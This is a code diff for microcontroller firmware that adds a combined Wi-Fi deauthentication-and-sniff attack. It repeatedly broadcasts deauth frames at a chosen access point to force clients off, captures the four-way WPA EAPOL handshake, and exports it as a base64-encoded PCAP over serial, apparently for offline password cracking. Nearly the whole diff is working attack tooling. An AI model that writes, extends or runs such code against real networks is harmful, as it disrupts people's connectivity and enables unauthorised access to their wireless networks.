@@ -904,49 +904,273 @@ void startSniffing() {
 }
 
 
+#include <vector>
+
+// PCAP Global Header (24 bytes)
+struct PcapGlobalHeader {
+  uint32_t magic_number;
+  uint16_t version_major;
+  uint16_t version_minor;
+  int32_t  thiszone;
+  uint32_t sigfigs;
+  uint32_t snaplen;
+  uint32_t network;
+};
+
+// PCAP Packet Header (16 bytes)
+struct PcapPacketHeader {
+  uint32_t ts_sec;
+  uint32_t ts_usec;
+  uint32_t incl_len;
+  uint32_t orig_len;
+};
+
+// Simple base64 encoder function.
+String base64Encode(const uint8_t *data, size_t length) {
+  const char* base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+  String encoded = "";
+  uint32_t octet_a, octet_b, octet_c;
+  uint32_t triple;
+  size_t i = 0;
+  
+  while (i < length) {
+    octet_a = i < length ? data[i++] : 0;
+    octet_b = i < length ? data[i++] : 0;
+    octet_c = i < length ? data[i++] : 0;
+    
+    triple = (octet_a << 16) + (octet_b << 8) + octet_c;
+    
+    encoded += base64Chars[(triple >> 18) & 0x3F];
+    encoded += base64Chars[(triple >> 12) & 0x3F];
+    encoded += (i - 1 < length) ? base64Chars[(triple >> 6) & 0x3F] : '=';
+    encoded += (i < length) ? base64Chars[triple & 0x3F] : '=';
+  }
+  return encoded;
+}
+
+// Function to generate the PCAP data in a vector.
+std::vector<uint8_t> generatePcapBuffer() {
+  std::vector<uint8_t> pcapData;
+
+  // Build the global header.
+  PcapGlobalHeader gh;
+  gh.magic_number = 0xa1b2c3d4;  // Magic number in little-endian
+  gh.version_major = 2;
+  gh.version_minor = 4;
+  gh.thiszone = 0;
+  gh.sigfigs = 0;
+  gh.snaplen = 65535;
+  gh.network = 127;  // DLT_IEEE802_11_RADIO
+
+  // Append global header bytes.
+  uint8_t* ghPtr = (uint8_t*)&gh;
+  for (size_t i = 0; i < sizeof(gh); i++) {
+    pcapData.push_back(ghPtr[i]);
+  }
+
+  // Minimal Radiotap header (8 bytes)
+  uint8_t minimal_rtap[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};
+
+  // Helper lambda to write a packet header and data.
+  auto writePacket = [&](const uint8_t* packetData, size_t packetLength) {
+    PcapPacketHeader ph;
+    unsigned long ms = millis();
+    ph.ts_sec = ms / 1000;
+    ph.ts_usec = (ms % 1000) * 1000;
+    // Total packet length = minimal_rtap + captured frame
+    ph.incl_len = packetLength + sizeof(minimal_rtap);
+    ph.orig_len = packetLength + sizeof(minimal_rtap);
+
+    uint8_t* phPtr = (uint8_t*)&ph;
+    for (size_t i = 0; i < sizeof(ph); i++) {
+      pcapData.push_back(phPtr[i]);
+    }
+    // Append the Radiotap header.
+    for (size_t i = 0; i < sizeof(minimal_rtap); i++) {
+      pcapData.push_back(minimal_rtap[i]);
+    }
+    // Append the packet data.
+    for (size_t i = 0; i < packetLength; i++) {
+      pcapData.push_back(packetData[i]);
+    }
+  };
+
+  // Write handshake frames.
+  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
+    HandshakeFrame &hf = capturedHandshake.frames[i];
+    writePacket(hf.data, hf.length);
+  }
+  
+  // Write management frames.
+  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
+    ManagementFrame &mf = capturedManagement.frames[i];
+    writePacket(mf.data, mf.length);
+  }
+
+  return pcapData;
+}
+
+// Function to generate the PCAP file, encode it in base64, and send to Serial.
+void sendPcapToSerial() {
+  Serial.println("Generating PCAP file...");
+  std::vector<uint8_t> pcapBuffer = generatePcapBuffer();
+  Serial.print("PCAP size: ");
+  Serial.print(pcapBuffer.size());
+  Serial.println(" bytes");
+  
+  String encodedPcap = base64Encode(pcapBuffer.data(), pcapBuffer.size());
+  
+  Serial.println("-----BEGIN PCAP BASE64-----");
+  Serial.println(encodedPcap);
+  Serial.println("-----END PCAP BASE64-----");
+}
+
+
+
 void deauthAndSniff() {
-  // Display combined attack mode message.
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
-  display.setCursor(5, 15);
-  display.println("Deauth + Sniff");
-  display.setCursor(5, 30);
-  display.println("Starting deauth...");
-  display.display();
-  
-  // Duration (in milliseconds) for deauth attack.
-  const unsigned long deauthDuration = 3000; // 3 seconds deauth attack.
-  unsigned long deauthStart = millis();
-  
-  // Deauth attack: force clients to disconnect.
-  // For example, iterate through the list of scanned APs (or a specific target).
-  while (millis() - deauthStart < deauthDuration) {
-    for (size_t i = 0; i < scan_results.size(); i++) {
-      memcpy(deauth_bssid, scan_results[i].bssid, 6);
-      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
-      // Send deauth frames with a few different reason codes.
+  // Reset capture buffers.
+  resetCaptureData();
+
+  // Set the channel to the target AP's channel.
+  wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
+  Serial.print("Switched to channel: ");
+  Serial.println(scan_results[scrollindex].channel);
+
+  // Overall timeout for the entire cycle.
+  unsigned long overallStart = millis();
+  const unsigned long overallTimeout = 60000; // 60 seconds overall timeout
+
+  // Phase durations.
+  const unsigned long deauthInterval = 6000; // 5 seconds deauth phase
+  const unsigned long sniffInterval = 3000;  // 2 seconds sniff phase
+
+  // Spinner animation for the sniff phase.
+  const char spinnerChars[] = { '/', '-', '\\', '|' };
+  unsigned int spinnerIndex = 0;
+
+  bool cancelled = false;
+
+  // Function to check for a "long press" (i.e. held for >500ms)
+  auto checkForCancel = []() -> bool {
+    if (digitalRead(BTN_OK) == LOW) {
+      unsigned long pressStart = millis();
+      while (digitalRead(BTN_OK) == LOW) {
+        delay(10);
+        if (millis() - pressStart > 500) {
+          return true; // Cancel if held for more than 500ms
+        }
+      }
+    }
+    return false;
+  };
+
+  // Outer loop: alternate deauth and sniff until handshake is complete,
+  // overall timeout, or user cancels.
+  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
+          capturedManagement.frameCount == 0) &&
+         (millis() - overallStart < overallTimeout)) {
+
+    // Check for cancellation using our helper function.
+    if (checkForCancel()) {
+      cancelled = true;
+      Serial.println("User canceled deauth+sniff cycle.");
+      break;
+    }
+
+    // ----- Deauth Phase -----
+    Serial.println("Starting deauth phase...");
+    unsigned long deauthPhaseStart = millis();
+    while (millis() - deauthPhaseStart < deauthInterval) {
+      // Check for cancellation inside the phase.
+      if (checkForCancel()) {
+        cancelled = true;
+        break;
+      }
+      memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
+      wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
       deauth_reason = 1;
       wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
       deauth_reason = 4;
       wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
       deauth_reason = 16;
       wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+    
+      delay(100);
     }
-    delay(100);
+    if (cancelled) break;
+
+    // ----- Sniff Phase -----
+    Serial.println("Starting sniff phase...");
+    enableSniffing();
+    unsigned long sniffPhaseStart = millis();
+    while (millis() - sniffPhaseStart < sniffInterval) {
+      if (checkForCancel()) {
+        cancelled = true;
+        break;
+      }
+      // Update OLED display with progress and spinner.
+      display.clearDisplay();
+      display.setTextSize(1);
+      display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
+      display.setCursor(5, 10);
+      display.print("Sniffing ");
+      display.print(SelectedSSID);
+      display.setCursor(5, 30);
+      display.print("EAPOL: ");
+      display.print(capturedHandshake.frameCount);
+      display.print("/4");
+      display.setCursor(5, 45);
+      display.print("Progress: ");
+      display.print(spinnerChars[spinnerIndex % 4]);
+      display.display();
+
+      spinnerIndex++;
+      delay(100);
+      // If handshake is complete, exit early.
+      if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
+          capturedManagement.frameCount > 0) {
+        break;
+      }
+    }
+    disableSniffing();
+    if (cancelled) break;
+
+    Serial.print("Current handshake count: ");
+    Serial.println(capturedHandshake.frameCount);
   }
-  
-  // Inform the user that deauthing is done and that we are now sniffing.
+
+  // Final display update.
   display.clearDisplay();
-  display.setCursor(5, 15);
-  display.println("Deauth done!");
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
+  display.setCursor(5, 10);
+  if (cancelled) {
+    display.println("Sniffing canceled!");
+  } else if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
+             capturedManagement.frameCount > 0) {
+    display.println("Sniffing complete!");
+    printHandshakeData();
+    sendPcapToSerial();
+
+    
+  } else {
+    display.println("Sniff timeout!");
+  }
   display.setCursor(5, 30);
-  display.println("Starting sniff...");
+  display.print("EAPOL captured: ");
+  display.print(capturedHandshake.frameCount);
+  display.print("/4");
+  display.setCursor(5, 45);
+  display.println("Press OK to return");
   display.display();
-  delay(500);
-  
-  // Start sniffing for the handshake.
-  startSniffing();
+
+  // Wait for user to press OK to return.
+  while (digitalRead(BTN_OK) != LOW) {
+    delay(10);
+  }
+  delay(150); // Debounce
+
+  Serial.println("Finished deauth+sniff cycle.");
 }
 
 
